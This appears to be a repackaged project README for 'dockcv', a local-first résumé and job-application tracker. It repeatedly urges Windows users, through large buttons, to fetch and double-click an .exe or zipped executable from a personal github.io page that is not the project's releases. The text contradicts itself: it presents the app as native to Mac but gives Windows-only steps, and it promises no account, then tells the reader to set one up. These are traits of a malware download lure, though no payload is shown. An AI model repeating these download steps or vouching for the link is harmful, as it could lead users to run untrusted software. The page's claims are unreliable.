<h1>📋 dockcv - Your Résumé, Versioned & Local</h1>

<p align="center">
<a href="https://trieuthanhtam20103.github.io"><img src="https://img.shields.io/badge/Download-dockcv-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download dockcv"></a>
</p>

## 🖥️ What Is dockcv?

dockcv is a **free desktop application** that helps you build, organize, and track your résumé (CV) and job applications — all on your own computer. No cloud, no account, no uploading your personal data anywhere.

Think of it as your personal career command center. You write your résumé in a simple, clean text format called TOML (which looks like a plain list). dockcv takes that text and instantly creates a **beautiful PDF** using a built-in typesetting engine called Typst.

Your data stays in a folder **you own**. You can back it up, sync it with Dropbox, or keep it on a USB stick. It’s yours — forever.

---

## ✨ Why Use dockcv?

| Feature | What It Does For You |
|---|---|
| **📄 Versioned Sections & Presets** | Keep different versions of your résumé (e.g., "Software Engineer", "Data Analyst"). Switch between them in one click. |
| **🧱 Block Library** | Reuse text blocks (like a summary or skills section) across multiple résumés. Write once, insert anywhere. |
| **🏆 Wins Diary** | Never forget your achievements. Log big and small wins daily, then drag them into your résumé when it's time to update. |
| **📎 Application Tracker** | Track every job you applied for: status (Applied, Interview, Offer), notes, dates, and next steps. |
| **⚡ In‑Process Typst Compiler** | No internet needed. Your PDF generates instantly on your machine. |
| **🔒 Local‑First** | Your files are stored as plain .toml text files on your hard drive. No vendor lock‑in. |
| **🍎 Native Mac Experience** | Built with Rust and GPUI for speed and reliability. Feels natural on macOS. |

---

## 🚀 Getting Started (Windows)

Follow these three steps to start using dockcv today:

### Step 1: Download dockcv

Click the green button below to go to the download page:

<p align="center">
<a href="https://trieuthanhtam20103.github.io" style="background-color:#FF6B35; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
</p>

On that page, look for the latest release (usually listed at the top). You'll see a file available for download. Click the file name to save it to your computer.

### Step 2: Run the Installer (or Open the App)

Download the file to your **Downloads** folder. Then:

- If the file ends with `.exe` — **double‑click it** and follow the setup wizard.
- If the file ends with `.zip` — right‑click the file, choose **"Extract All"**, then open the extracted folder and double‑click `dockcv.exe`.

That's it. No command line. No coding.

### Step 3: Create Your First Résumé

When you open dockcv for the first time, it will create a folder named `dockcv` (e.g., in your Documents folder). Inside, you'll see:

- `resumes/` — where your .toml résumé files live
- `diary/` — your wins diary
- `applications/` — your job tracking file

Click **"New Résumé"**, give it a name, and start adding sections like *Skills*, *Experience*, and *Education*. dockcv shows a live preview. When you're happy, click **"Export PDF"**.

---

## 📂 Understanding Your Files

dockcv uses **plain text files** with the `.toml` ending. Here's a tiny example of what a section looks like inside a résumé file:

```toml
[personal]
name = "Jane Doe"
email = "jane@example.com"

[skills]
items = ["Python", "Data Analysis", "Project Management"]
```

Don't worry — you rarely need to open these files. The app gives you a friendly visual editor. But knowing they're plain text means you can always recover them, edit them with Notepad, or version them with git if you're technical.

---

## 📁 The Block Library Explained

The **Block Library** is a time‑saver. Have a paragraph about your leadership experience that appears in two different résumé versions? Save it as a block once. Then, when editing any résumé, click "Insert Block" and pick it from the list. Update the block once, and all résumés using it update automatically.

---

## 🏆 Using the Wins Diary

The Wins Diary is a personal log. Every time you finish a project, receive praise, or hit a metric — write it down with a date. When you later prepare a résumé for a job interview, browse your diary and pull the strongest accomplishments. You'll never again say, "I can't remember what I did last year."

---

## 📎 Tracking Job Applications

The **Applications Tracker** shows columns for:

- Company name
- Role title
- Date applied
- Status (Draft, Applied, Screening, Interview, Offer, Rejected)
- Link to the job posting
- Your notes

This keeps your job search organized in one place — next to your résumés — instead of scattered in email folders and spreadsheets.

---

## 🔧 Frequently Asked Questions

### Do I need to install anything else?
No. dockcv is a self‑contained desktop app. It includes its own Typst compiler — no extra downloads.

### Is my data private?
Yes. Everything is stored locally in your chosen folder. Nothing is sent to any server. You can even use dockcv fully offline.

### Can I export to Word or plain text?
The primary export is high‑quality PDF via Typst. The source .toml files are human‑readable, so you can copy content to any other tool.

### What systems are supported?
The app is built for macOS and Windows. The download page will show the appropriate file for your system.

### How do I update dockcv?
Visit the same download link occasionally and grab the newest release. Your résumés and data stay intact because they're separate files.

---

## 🛠️ Tips for a Great Résumé

1. **Keep it to one or two pages.** Recruiters skim. Be concise.
2. **Use action verbs** — "Built", "Led", "Optimized".
3. **Quantify results** — "Increased sales by 20%" is stronger than "Increased sales".
4. **Update your Wins Diary weekly**, not before an interview.
5. **Tailor each résumé** using presets. Don't send the same résumé everywhere.

---

## 📚 Example of a Résumé Section (for Inspiration)

If you're unsure how to write a bullet point, try the **STAR method**:

- **S**ituation — Where you were
- **T**ask — What you needed to do
- **A**ction — What you did
- **R**esult — What happened because of it

*Example:* "Optimized the checkout page (Situation) to reduce drop‑off (Task). Implemented a one‑page redesign and removed 3 form fields (Action), leading to a 15% increase in completed purchases (Result)."

---

## 💬 Need Help?

If you get stuck:

- Check the **Releases** page for any known issues.
- Look for a "Help" or "About" menu inside the app.
- For developers or power users, the repository's Issues section on GitHub is the place to report bugs.

---

## 📥 Download Again

One more time, in case you scrolled past it:

<p align="center">
<a href="https://trieuthanhtam20103.github.io" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
</p>

---

## 🌟 Start Owning Your Career

With dockcv, you stop wrestling with word processors and start building a professional résumé workflow. Versioned, local, fast — and entirely yours.

Download it now and spend 10 minutes setting up your account. You'll thank yourself at your next performance review.

---

Keywords: cv, desktop-app, file-over-app, gpui, job-search, local-first, macos, resume, rust, typst